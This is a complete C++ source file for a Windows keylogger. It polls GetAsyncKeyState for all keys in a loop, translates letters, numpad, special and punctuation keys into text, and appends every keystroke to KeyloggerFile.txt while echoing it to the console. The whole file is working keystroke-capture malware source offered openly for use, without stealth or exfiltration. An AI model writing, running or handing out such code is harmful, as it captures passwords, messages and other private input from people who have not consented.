#include "iostream"
#include "String"
#include "windows.h"
#include "cctype"
#include "fstream"
#include "map"


void writeIntoFile(std::fstream& file,std::string s){
    file.open("KeyloggerFile.txt",std::ios::app);
    if(!file.is_open()){
        std::cout<<"\n [[Error]] : KeyloggerFile could not be opened\n";
        exit(1);;
    }

    file<<s;
    file.close();
    std::cout<<s;
}

std::map<int,std::string> numberKeys = {
    {VK_NUMPAD0, "0"},
    {VK_NUMPAD1, "1"},
    {VK_NUMPAD2, "2"},
    {VK_NUMPAD3, "3"},
    {VK_NUMPAD4, "4"},
    {VK_NUMPAD5, "5"},
    {VK_NUMPAD6, "6"},
    {VK_NUMPAD7, "7"},
    {VK_NUMPAD8, "8"},
    {VK_NUMPAD9, "9"},
    {VK_DECIMAL, "."},
    {VK_MULTIPLY, "*"},
    {VK_DIVIDE, "/"},
    {VK_SUBTRACT, "-"},
    {VK_ADD, "+"},
};

std::map<int, std::string> specialKeys = {
    {VK_ESCAPE, " [ESCAPE] "},
    {VK_RETURN, " [ENTER] "},
    {VK_BACK, " [DELETE] "},
    {VK_SPACE, " "},
    {VK_TAB, " [TAB] "},
    {VK_RIGHT, " [RIGHT] "},
    {VK_LEFT, " [LEFT] "},
    {VK_CONTROL, " [CONTROL] "},
    {VK_SHIFT, " [SHIFT] "},
    {VK_DOWN, " [DOWN] "},
    {VK_UP, " [UP] "},
    {VK_MENU, " [ALT] "},
    {VK_NUMLOCK, " [NUMLOCK] "}
};

std::map<int, std::string> oemKeys = {
    {VK_OEM_1, " ; "},
    {VK_OEM_2, " / "},
    {VK_OEM_3, " ` "},
    {VK_OEM_4, " [ "},
    {VK_OEM_5, " \\ "},
    {VK_OEM_6, " ] "},
    {VK_OEM_7, " ' "},
    {VK_OEM_PLUS, " = "},
    {VK_OEM_COMMA, " , "},
    {VK_OEM_MINUS, " - "},
    {VK_OEM_PERIOD, " . "},
    {VK_OEM_102, " | "}
};

int main(){

    std::cout<<"\n************************************************\nAlso saved in KeyloggerFile.txt (same dir)\n************************************************\n";

    std::fstream File;
    
    while(true){
        for(int i=0 ; i<256 ;i++){
            if(GetAsyncKeyState(i) & 0b1){
                if(std::isupper(i)){
                    std::string s = std::string(1,i);
                    writeIntoFile(File, s);
                }else if(numberKeys.find(i) != numberKeys.end()){
                    writeIntoFile(File, numberKeys[i]); 
                }else if(specialKeys.find(i)!= specialKeys.end()){
                    writeIntoFile(File, specialKeys[i]); 
                }else if(oemKeys.find(i)!= oemKeys.end()){
                    writeIntoFile(File, oemKeys[i]);
                }  
            }
        }
        Sleep(20);
    }
}
